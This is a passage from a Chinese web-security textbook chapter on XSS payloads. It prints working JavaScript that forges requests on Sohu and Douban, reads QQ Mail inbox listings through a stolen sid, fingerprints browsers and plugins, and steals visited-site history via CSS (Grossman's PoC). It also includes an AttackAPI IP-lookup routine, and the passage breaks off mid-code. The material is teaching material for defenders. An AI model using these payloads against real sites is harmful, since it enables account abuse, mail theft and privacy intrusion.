<h3 id="3-2-2-强大的XSS-Payload"><a href="#3-2-2-强大的XSS-Payload" class="headerlink" title="3.2.2 强大的XSS Payload"></a>3.2.2 强大的XSS Payload</h3><p>“Cookie劫持”并非所有的时候都会有效。有的网站可能会在Set-Cookie时给关键Cookie植入HttpOnly标识；有的网站则可能会把Cookie与客户端IP绑定（相关内容在“XSS的防御”一节中会具体介绍），从而使得XSS窃取的Cookie失去意义。<br>尽管如此，在XSS攻击成功后，攻击者仍然有许多方式能够控制用户的浏览器。</p>
<p>构造GET与POST请求</p>
<p>一个网站的应用，只需要接受HTTP协议中的GET或POST请求，即可完成所有操作。对于攻击者来说，仅通过JavaScript，就可以让浏览器发起这两种请求。</p>
<p>假设Sohu博客所在域的某页面存在XSS漏洞，那么通过JavaScript，这个过程如下。</p>
<p>正常删除该文章的链接是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012</div></pre></td></tr></table></figure>
<p>对于攻击者来说，只需要知道文章的id，就能够通过这个请求删除这篇文章了。在本例中，文章的id是156713012。<br>攻击者可以通过插入一张图片来发起一个GET请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var img = document.createElement(&quot;img&quot;);</div><div class="line">img.src = &quot;http://blog.sohu.com/manage/entry.do?m=delete&amp;id=156713012&quot;;</div><div class="line">document.body.appendChild(img);</div></pre></td></tr></table></figure>
<p>攻击者只需要让博客的作者执行这段JavaScript代码（XSS Payload），就会把这篇文章删除。在具体攻击中，攻击者将通过XSS诱使用户执行XSS Payload。</p>
<p>再看一个复杂点的例子。如果网站应用者接受POST请求，那么攻击者如何实施XSS攻击呢？</p>
<p>下例是Douban的一处表单。攻击者将通过JavaScript发出一个POST请求，提交此表单，最终发出一条新的消息。在正常情况下，发出一条消息，浏览器发的包是：<br>Douban上发新消息的请求包</p>
<p>要模拟这一过程，有两种方法。第一种方法是，构造一个form表单，然后自动提交这个表单：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> f = <span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</div><div class="line">f.action = <span class="string">""</span>;</div><div class="line">f.method = <span class="string">"post"</span>;</div><div class="line"><span class="built_in">document</span>.body.appendChild(f);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i1 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">i1.name = <span class="string">" ck"</span>;</div><div class="line">i1.value = <span class="string">" JiUY"</span>;</div><div class="line">f.appendChild(i1);</div><div class="line"></div><div class="line"><span class="keyword">var</span> i2 = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</div><div class="line">i2.name = <span class="string">" mb_text"</span>;</div><div class="line">i2.value = <span class="string">"testtesttest"</span>;</div><div class="line">f.appendChild(i2);</div><div class="line"></div><div class="line">f.submit();</div></pre></td></tr></table></figure>
<p>如果表单的参数很多的话，通过构造DOM节点的方式，代码将会非常冗长。所以可以直接写HTML代码，这样会使得整个代码精简很多，如下所示：var dd = document.createElement(“div”);</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="built_in">document</span>.body.appendChild(dd);</div><div class="line">dd.innerHTML = <span class="string">'&lt;form action="" method="post" id="xssform" name="mbform"&gt;'</span>+</div><div class="line"><span class="string">'&lt;input type="hidden" value="JiUY" name="ck" /&gt;'</span>+</div><div class="line"><span class="string">'&lt;input type="text" value="testtesttest" name="mb_text" /&gt;'</span>+</div><div class="line"><span class="string">'&lt;/form&gt;'</span></div><div class="line"></div><div class="line"><span class="built_in">document</span>.getElementById(<span class="string">"xssform"</span>).submit();</div></pre></td></tr></table></figure>
<p>自动提交表单成功：<br>通过表单自动提交发消息成功</p>
<p>第二种方法是，通过XMLHttpRequest发送一个POST请求：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="string">"http://www.douban.com"</span>;</div><div class="line"><span class="keyword">var</span> postStr = <span class="string">"ck=JiUY&amp;mb_text=test1234"</span>;</div><div class="line"><span class="keyword">var</span> ajax = <span class="literal">null</span>;</div><div class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)&#123;</div><div class="line">  ajax = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject)&#123;</div><div class="line">  ajax = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">  <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open(<span class="string">"POST"</span>, url, <span class="literal">true</span>);</div><div class="line">ajax.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</div><div class="line">ajax.send(postStr);</div><div class="line"></div><div class="line">ajax.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span> (ajax.readyState == <span class="number">4</span> &amp;&amp; ajax.status == <span class="number">200</span>)&#123;</div><div class="line">    alert(<span class="string">"Done!"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>再次提交成功：</p>
<p>通过XMLHttpRequest发消息成功<br>通过这个例子可以清楚地看到，使用JavaScript模拟浏览器发包并不是一件困难的事情。<br>所以XSS攻击后，攻击者除了可以实施“Cookie劫持”外，还能够通过模拟GET、POST请求操作用户的浏览器。这在某些隔离环境中会非常有用，比如“Cookie劫持”失效时，或者目标用户的网络不能访问互联网等情况。</p>
<p>下面这个例子将演示如何通过XSS Payload读取QMail用户的邮件文件夹。<br>首先看看正常的请求是如何获取到所有的邮件列表的。登录邮箱后，可以看到：<br>QQ邮箱的界面</p>
<p>点击“收件箱”后，看到邮件列表。抓包发现浏览器发出了如下请求：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://m57.mail.qq.com/cgi-bin/mail_list?sid=6alhx3p5yzh9a2om7U51dDyz&amp;folderid=1&amp;page</div><div class="line">=0&amp;s=inbox&amp;loc=folderlist,,,1</div></pre></td></tr></table></figure>
<p>QQ邮箱的邮件列表<br>经过分析发现，真正能访问到邮件列表的链接是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&amp;page=0&amp;s=inbox&amp;sid=6alhx3p5yzh9a2</div><div class="line">om7U51dDyz</div></pre></td></tr></table></figure>
<p>在Firebug中分析QQ邮箱的页面内容<br>这里有一个无法直接构造出的参数值：sid。从字面推测，这个sid参数应该是用户ID加密后的值。<br>所以，XSS Payload的思路是先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求此URL，应该就能得到邮件列表了。XSS Payload如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">if (top.window.location.href.indexOf("sid=")&gt;0)&#123;</div><div class="line">  var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=")</div><div class="line">  +4,24);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">var folder_url = "http://"+top.window.location.host+"/cgi-bin/mail_list?folderid=</div><div class="line">1&amp;page=0&amp;s=inbox&amp;sid="+sid;</div><div class="line"></div><div class="line">var ajax = null;</div><div class="line">if(window.XMLHttpRequest)&#123;</div><div class="line">  ajax = new XMLHttpRequest();</div><div class="line">&#125;</div><div class="line">else if(window.ActiveXObject)&#123;</div><div class="line">  ajax = new ActiveXObject("Microsoft.XMLHTTP");</div><div class="line">&#125;</div><div class="line">else&#123;</div><div class="line">  return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ajax.open("GET", folder_url, true);</div><div class="line">ajax.send(null);</div><div class="line"></div><div class="line">ajax.onreadystatechange = function()&#123;</div><div class="line">  if (ajax.readyState == 4 &amp;&amp; ajax.status == 200)&#123;</div><div class="line">    alert(ajax.responseText);</div><div class="line">    //document.write(ajax.responseText)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>执行这段代码后：</p>
<p>获取邮件内容<br>邮件列表的内容成功被XSS Payload获取到。<br>攻击者获取到邮件列表的内容后，还可以读取每封邮件的内容，并发送到远程服务器上。这只需要构造不同的GET或POST请求即可，在此不再赘述，有兴趣的读者可以自己通过JavaScript实现这个功能。</p>
<p>XSS并非万能。在前文的例子中，XSS的攻击过程都是在浏览器中通过JavaScript脚本自动进行的，也就是说，缺少“与用户交互”的过程。</p>
<p>比如在前文提到的“通过POST表单发消息”的案例中，如果在提交表单时要求用户输入验证码，那么一般的XSS Payload都会失效；此外，在大多数“修改用户密码”的功能中，在提交新密码前，都会要求用户输入“Old Password”。而这个“Old Password”，对于攻击者来说，往往是不知道的。<br>但是，这就能限制住XSS攻击吗？答案是否定的。<br>对于验证码，XSS Payload可以通过读取页面内容，将验证码的图片URL发送到远程服务器上来实施——攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码。</p>
<p>修改密码的问题稍微复杂点。为了窃取密码，攻击者可以将XSS与“钓鱼”相结合。<br>实现思路很简单：利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将被发送至黑客的服务器上。<br>通过JavaScript伪造的登录框<br>充分发挥想象力，可以使得XSS攻击的威力更加巨大。</p>
<p>在很多时候，攻击者为了获取更大的利益，往往需要准确地收集用户的个人信息。比如，如果知道用户使用的浏览器、操作系统，攻击者就有可能实施一次精准的浏览器内存攻击，最终给用户电脑植入一个木马。XSS能够帮助攻击者快速达到收集信息的目的。<br>如何通过JavaScript脚本识别浏览器版本呢？最直接的莫过于通过XSS读取浏览器的UserAgent对象：alert(navigator.userAgent);</p>
<p>这个对象，告诉我们很多客户端的信息：<br>OS版本：Windows NT 5.1（这是Windows XP的内核版本）<br>浏览器版本：Firefox 3.6.7<br>系统语言：zh-CN（简体中文）<br>但是浏览器的UserAgent是可以伪造的。比如，Firefox有很多扩展可以屏蔽或自定义浏览器发送的UserAgent。所以通过JavaScript取出来的这个浏览器对象，信息并不一定准确。</p>
<p>但对于攻击者来说，还有另外一种技巧，可以更准确地识别用户的浏览器版本。<br>由于浏览器之间的实现存在差异——不同的浏览器会各自实现一些独特的功能，而同一个浏览器的不同版本之间也可能会有细微差别。所以通过分辨这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。这种方法比读取UserAgent要准确得多。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.ActiveXObject)&#123; <span class="comment">// MSIE 6.0 or below</span></div><div class="line"></div><div class="line">  <span class="comment">//判断是否是IE 7以上</span></div><div class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.documentElement &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">document</span>.documentElement.style.maxHeight!=</div><div class="line">    <span class="string">"undefined"</span> )&#123;</div><div class="line"></div><div class="line">      <span class="comment">//判断是否是 IE 8+</span></div><div class="line">      <span class="keyword">if</span> ( <span class="keyword">typeof</span> <span class="built_in">document</span>.adoptNode != <span class="string">"undefined"</span>) &#123; <span class="comment">// Safari3 &amp; FF &amp; Opera &amp; Chrome</span></div><div class="line">        &amp; IE8</div><div class="line">        <span class="comment">//MSIE 8.0  因为同时满足前两个if判断，所以//在这里是IE 8</span></div><div class="line">      &#125;</div><div class="line">      <span class="comment">// MSIE 7.0  否则就是IE 7</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"msie"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.opera != <span class="string">"undefined"</span>) &#123; <span class="comment">//Opera独占</span></div><div class="line">    <span class="comment">// "Opera "+window.opera.version()</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"opera"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.netscape != <span class="string">"undefined"</span>) &#123; <span class="comment">//Mozilla 独占</span></div><div class="line">    <span class="comment">// "Mozilla"</span></div><div class="line">    <span class="comment">// 可以准确识别大版本</span></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.Iterator != <span class="string">"undefined"</span>) &#123;</div><div class="line">      <span class="comment">// Firefox 2 以上支持这个对象</span></div><div class="line"></div><div class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.styleSheetSets != <span class="string">"undefined"</span>) &#123; <span class="comment">// Firefox 3 &amp; Opera 9</span></div><div class="line">        <span class="comment">// Firefox 3  同时满足这些条件的必然是 Firefox 3了</span></div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="string">"mozilla"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.pageXOffset != <span class="string">"undefined"</span>) &#123; <span class="comment">// Mozilla &amp; Safari</span></div><div class="line">    <span class="comment">//"Safari"</span></div><div class="line">    <span class="keyword">try</span>&#123;</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> external.AddSearchProvider != <span class="string">"undefined"</span>) &#123; <span class="comment">// Firefox &amp; Google Chrome</span></div><div class="line">        <span class="comment">//Google Chrome</span></div><div class="line">        <span class="keyword">return</span> <span class="string">"chrome"</span>;</div><div class="line">      &#125;</div><div class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">      <span class="keyword">return</span> <span class="string">"safari"</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123; <span class="comment">//unknown</span></div><div class="line">    <span class="comment">//Unknown</span></div><div class="line">    <span class="keyword">return</span> <span class="string">"unknown"</span>;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>这段代码，找到了几个浏览器独有的对象，能够识别浏览器的大版本。依据这个思路，还可以找到更多“独特的”浏览器对象。</p>
<p>安全研究者Gareth Heyes曾经找到一种更巧妙的方法，通过很精简的代码，即可识别出不同的浏览器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">//Firefox detector 2/3 by DoctorDan</div><div class="line">FF=/a/[-1]==&apos;a&apos;</div><div class="line"></div><div class="line">//Firefox 3 by me:-</div><div class="line">FF3=(function x()&#123;&#125;)[-5]==&apos;x&apos;</div><div class="line"></div><div class="line">//Firefox 2 by me:-</div><div class="line">FF2=(function x()&#123;&#125;)[-6]==&apos;x&apos;</div><div class="line"></div><div class="line">//IE detector I posted previously</div><div class="line">IE=&apos;\v&apos;==&apos;v&apos;</div><div class="line"></div><div class="line">//Safari detector by me</div><div class="line">Saf=/a/.__proto__==&apos;//&apos;</div><div class="line"></div><div class="line">//Chrome by me</div><div class="line">Chr=/source/.test((/a/.toString+&apos;&apos;))</div><div class="line"></div><div class="line">//Opera by me</div><div class="line">Op=/^function \(/.test([].sort)</div><div class="line"></div><div class="line">//IE6 detector using conditionals</div><div class="line">try &#123;IE6=@cc_on @_jscript_version &lt;= 5.7&amp;&amp;@_jscript_build&lt;10000</div><div class="line"></div><div class="line">精简为一行代码，即：</div><div class="line">B=(function x()&#123;&#125;)[-5]==&apos;x&apos;?&apos;FF3&apos;:(function</div><div class="line">x()&#123;&#125;)[-6]==&apos;x&apos;?&apos;FF2&apos;:/a/[-1]==&apos;a&apos;?&apos;FF&apos;:&apos;\v&apos;==&apos;v&apos;?&apos;IE&apos;:/a/.__proto__==&apos;//&apos;?&apos;Saf&apos;:/s/.</div><div class="line">test(/a/.toString)?&apos;Chr&apos;:/^function \(/.test([].sort)?&apos;Op&apos;:&apos;Unknown&apos;</div></pre></td></tr></table></figure>
<p>知道了用户使用的浏览器、操作系统后，进一步可以识别用户安装的软件。<br>在IE中，可以通过判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。这种方法很早就被用于“挂马攻击”——黑客通过判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。<br>看如下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">try &#123;</div><div class="line">var Obj = new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);</div><div class="line">&#125; catch (e)&#123;</div><div class="line">  // 异常了，不存在该控件</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码检测迅雷的一个控件（<code>XunLeiBHO.ThunderIEHelper</code>）是否存在。如果用户安装了迅雷软件，则默认也会安装此控件。因此通过判断此控件，即可推测用户安装了迅雷软件的可能性。</p>
<p>通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。</p>
<p>一些第三方软件也可能会泄露一些信息。比如Flash有一个<code>system.capabilities</code>对象，能够查询客户端电脑中的硬件信息：Flash的<code>system.capabilities</code>对象<br>在XSS Payload中使用时，可以在Flash的ActionScript中读取<code>system.capabilities</code>对象后，将结果通过ExternalInterface传给页面的JavaScript。这个过程在此不再赘述了。<br>浏览器的扩展和插件也能被XSS Payload扫描出来。比如对于Firefox的插件和扩展，有着不同的检测方法。<br>Firefox的插件（Plugins）列表存放在一个DOM对象中，通过查询DOM可以遍历出所有的插件：Firefox的plugins对象<br>所以直接查询<code>navigator.plugins</code>对象，就能找到所有的插件了。在上图中所示的插件是“navigator.plugins[0]”。</p>
<p>而Firefox的扩展（Extension）要复杂一些。有安全研究者想出了一个方法：通过检测扩展的图标，来判断某个特定的扩展是否存在。在Firefox中有一个特殊的协议：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">chrome://，Firefox的扩展图标可以通过这个协议被访问到。比如Flash Got扩展的图标，可以这样访问：</div><div class="line">chrome://flashgot/skin/icon32.png</div></pre></td></tr></table></figure>
<p>扫描Firefox扩展时，只需在JavaScript中加载这张图片，如果加载成功，则扩展存在；反之，扩展不存在。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var m = new Image();</div><div class="line">  m.onload = function() &#123;</div><div class="line">    alert(1);</div><div class="line">    //图片存在</div><div class="line">  &#125;;</div><div class="line">  m.onerror = function() &#123;</div><div class="line">    alert(2);</div><div class="line">    //图片不存在</div><div class="line">  &#125;;</div><div class="line">  m.src = &quot;chrome://flashgot/skin/icon32.png&quot;;  //连接图片</div></pre></td></tr></table></figure>
<p><hr></p>
<h3 id="3-2-2-5-CSS-History-Hack"><a href="#3-2-2-5-CSS-History-Hack" class="headerlink" title="3.2.2.5　CSS History Hack"></a>3.2.2.5　CSS History Hack</h3><p>我们再看看另外一个有趣的XSS Payload——通过CSS，来发现一个用户曾经访问过的网站。<br>这个技巧最早被Jeremiah Grossman发现，其原理是利用style的visited属性——如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;body&gt;</div><div class="line"> &lt;a href=# &gt;曾经访问过的&lt;/a&gt;</div><div class="line"> &lt;a href=&quot;notexist&quot; &gt;未曾访问过的&lt;/a&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>浏览器会将点击过的链接示以不同的颜色：<br>安全研究者Rsnake公布了一个POC，其效果如下：<br>Rsnake演示的攻击效果<br>红色标记的，就是用户曾经访问过的网站（即Visited下的两个网站）。<br>这个POC代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">&lt;!--</div><div class="line"><span class="comment">/*</span></div><div class="line">NAME: JavaScript History Thief</div><div class="line">AUTHOR: Jeremiah Grossman</div><div class="line"></div><div class="line">BSD LICENSE:</div><div class="line">Copyright (c) 2006, WhiteHat Security, Inc.</div><div class="line">All rights reserved.</div><div class="line"></div><div class="line">Redistribution and use in source and binary forms, with or without</div><div class="line">modification, are permitted provided that the following conditions are met:</div><div class="line">* Redistributions of source code must retain the above copyright notice,</div><div class="line">  this list of conditions and the following disclaimer.</div><div class="line">* Redistributions in binary form must reproduce the above copyright notice,</div><div class="line">  this list of conditions and the following disclaimer in the documentation</div><div class="line">  and/or other materials provided with the distribution.</div><div class="line">* Neither the name of the WhiteHat Security nor the names of its contributors</div><div class="line">  may be used to endorse or promote products derived from this software</div><div class="line">  without specific prior written permission.</div><div class="line"></div><div class="line">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</div><div class="line">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</div><div class="line">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE</div><div class="line">ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE</div><div class="line">LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR</div><div class="line">CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF</div><div class="line">SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS</div><div class="line">INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN</div><div class="line">CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)</div><div class="line">ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF</div><div class="line">THE POSSIBILITY OF SUCH DAMAGE.</div><div class="line">*/</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">/* A short list of websites to loop through checking to see if the victim has been there.</span></div><div class="line">Without noticable performance overhead, testing couple of a couple thousand URL's is</div><div class="line">possible within a few seconds. */</div><div class="line"><span class="keyword">var</span> websites = [</div><div class="line"> <span class="string">"http://ha.ckers.org/blog/"</span>,</div><div class="line"> <span class="string">"http://login.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://mail.google.com/"</span>,</div><div class="line"> <span class="string">"http://mail.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://my.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://sla.ckers.org/forum/"</span>,</div><div class="line"> <span class="string">"http://slashdot.org/"</span>,</div><div class="line"> <span class="string">"http://www.amazon.com/"</span>,</div><div class="line"> <span class="string">"http://www.aol.com/"</span>,</div><div class="line"> <span class="string">"http://www.apple.com/"</span>,</div><div class="line"> <span class="string">"http://www.bankofamerica.com/"</span>,</div><div class="line"> <span class="string">"http://www.bankone.com/"</span>,</div><div class="line"> <span class="string">"http://www.blackhat.com/"</span>,</div><div class="line"> <span class="string">"http://www.blogger.com/"</span>,</div><div class="line"> <span class="string">"http://www.bofa.com/"</span>,</div><div class="line"> <span class="string">"http://www.capitalone.com/"</span>,</div><div class="line"> <span class="string">"http://www.cgisecurity.com/"</span>,</div><div class="line"> <span class="string">"http://www.chase.com/"</span>,</div><div class="line"> <span class="string">"http://www.citibank.com/"</span>,</div><div class="line"> <span class="string">"http://www.cnn.com/"</span>,</div><div class="line"> <span class="string">"http://www.comerica.com/"</span>,</div><div class="line"> <span class="string">"http://www.e-gold.com/"</span>,</div><div class="line"> <span class="string">"http://www.ebay.com/"</span>,</div><div class="line"> <span class="string">"http://www.etrade.com/"</span>,</div><div class="line"> <span class="string">"http://www.flickr.com/"</span>,</div><div class="line"> <span class="string">"http://www.google.com/"</span>,</div><div class="line"> <span class="string">"http://www.hsbc.com/"</span>,</div><div class="line"> <span class="string">"http://www.icq.com/"</span>,</div><div class="line"> <span class="string">"http://www.live.com/"</span>,</div><div class="line"> <span class="string">"http://www.microsoft.com/"</span>,</div><div class="line"> <span class="string">"http://www.microsoft.com/en/us/default.aspx"</span>,</div><div class="line"> <span class="string">"http://www.msn.com/"</span>,</div><div class="line"> <span class="string">"http://www.myspace.com/"</span>,</div><div class="line"> <span class="string">"http://www.passport.net/"</span>,</div><div class="line"> <span class="string">"http://www.paypal.com/"</span>,</div><div class="line"> <span class="string">"http://www.rsaconference.com/2007/US/"</span>,</div><div class="line"> <span class="string">"http://www.salesforce.com/"</span>,</div><div class="line"> <span class="string">"http://www.sourceforge.net/"</span>,</div><div class="line"> <span class="string">"http://www.statefarm.com/"</span>,</div><div class="line"> <span class="string">"http://www.usbank.com/"</span>,</div><div class="line"> <span class="string">"http://www.wachovia.com/"</span>,</div><div class="line"> <span class="string">"http://www.wamu.com/"</span>,</div><div class="line"> <span class="string">"http://www.wellsfargo.com/"</span>,</div><div class="line"> <span class="string">"http://www.whitehatsec.com/home/index.html"</span>,</div><div class="line"> <span class="string">"http://www.wikipedia.org/"</span>,</div><div class="line"> <span class="string">"http://www.xanga.com/"</span>,</div><div class="line"> <span class="string">"http://www.yahoo.com/"</span>,</div><div class="line"> <span class="string">"http://www2.blogger.com/home"</span>,</div><div class="line"> <span class="string">"https://banking.wellsfargo.com/"</span>,</div><div class="line"> <span class="string">"https://commerce.blackhat.com/"</span>,</div><div class="line"></div><div class="line"></div><div class="line">];</div><div class="line"></div><div class="line"><span class="comment">/* Loop through each URL */</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; websites.length; i++) &#123;</div><div class="line"></div><div class="line"> <span class="comment">/* create the new anchor tag with the appropriate URL information */</span></div><div class="line"> <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</div><div class="line"> link.id = <span class="string">"id"</span> + i;</div><div class="line"> link.href = websites[i];</div><div class="line"> link.innerHTML = websites[i];</div><div class="line"></div><div class="line"> <span class="comment">/* create a custom style tag for the specific link. Set the CSS visited selector to a</span></div><div class="line">known value, in this case red */</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'&lt;style&gt;'</span>);</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'#id'</span> + i + <span class="string">":visited &#123;color: #FF0000;&#125;"</span>);</div><div class="line"> <span class="built_in">document</span>.write(<span class="string">'&lt;/style&gt;'</span>);</div><div class="line"></div><div class="line"> <span class="comment">/* quickly add and remove the link from the DOM with enough time to save the visible</span></div><div class="line">computed color. */</div><div class="line"> <span class="built_in">document</span>.body.appendChild(link);</div><div class="line"> <span class="keyword">var</span> color =</div><div class="line"><span class="built_in">document</span>.defaultView.getComputedStyle(link,<span class="literal">null</span>).getPropertyValue(<span class="string">"color"</span>);</div><div class="line"> <span class="built_in">document</span>.body.removeChild(link);</div><div class="line"></div><div class="line"> <span class="comment">/* check to see if the link has been visited if the computed color is red */</span></div><div class="line"> <span class="keyword">if</span> (color == <span class="string">"rgb(255, 0, 0)"</span>) &#123; <span class="comment">// visited</span></div><div class="line"></div><div class="line"> <span class="comment">/* add the link to the visited list */</span></div><div class="line"> <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line"> item.appendChild(link);</div><div class="line"> <span class="built_in">document</span>.getElementById(<span class="string">'visited'</span>).appendChild(item);</div><div class="line"></div><div class="line"> &#125; <span class="keyword">else</span> &#123; <span class="comment">// not visited</span></div><div class="line"></div><div class="line"> <span class="comment">/* add the link to the not visited list */</span></div><div class="line"> <span class="keyword">var</span> item = <span class="built_in">document</span>.createElement(<span class="string">'li'</span>);</div><div class="line"> item.appendChild(link);</div><div class="line"> <span class="built_in">document</span>.getElementById(<span class="string">'notvisited'</span>).appendChild(item);</div><div class="line"></div><div class="line"> &#125; <span class="comment">// end visited color check if</span></div><div class="line"></div><div class="line">&#125; <span class="comment">// end URL loop</span></div><div class="line"><span class="comment">// --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>但是Firefox在2010年3月底决定修补这个问题，因此，未来这种信息泄露的问题可能在Mozilla浏览器中不会再继续存在了。</p>
<p>获取用户的真实IP地址<br>通过XSS Payload还有办法获取一些客户端的本地IP地址。<br>很多时候，用户电脑使用了代理服务器，或者在局域网中隐藏在NAT后面。网站看到的客户端IP地址，是内网的出口IP地址，而并非用户电脑真实的本地IP地址。如何才能知道用户的本地IP地址呢？<br>JavaScript本身并没有提供获取本地IP地址的能力，有没有其他办法？一般来说，XSS攻击需要借助第三方软件来完成。比如，客户端安装了Java环境（JRE），那么XSS就可以通过调用Java Applet的接口获取客户端的本地IP地址。<br>在XSS攻击框架“Attack API”中，就有一个获取本地IP地址的API：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">* <span class="doctag">@cat</span> DOM</div><div class="line">* <span class="doctag">@name</span> AttackAPI.dom.getInternalIP</div><div class="line">* <span class="doctag">@desc</span> get internal IP address</div><div class="line">* <span class="doctag">@return</span> &#123;String&#125; IP address</div><div class="line">   */</div><div class="line">  AttackAPI.dom.getInternalIP = function () &#123;</div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               <span class="keyword">return</span> sock.getLocalAddress().getHostAddress();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line"></div><div class="line">       <span class="keyword">return</span> <span 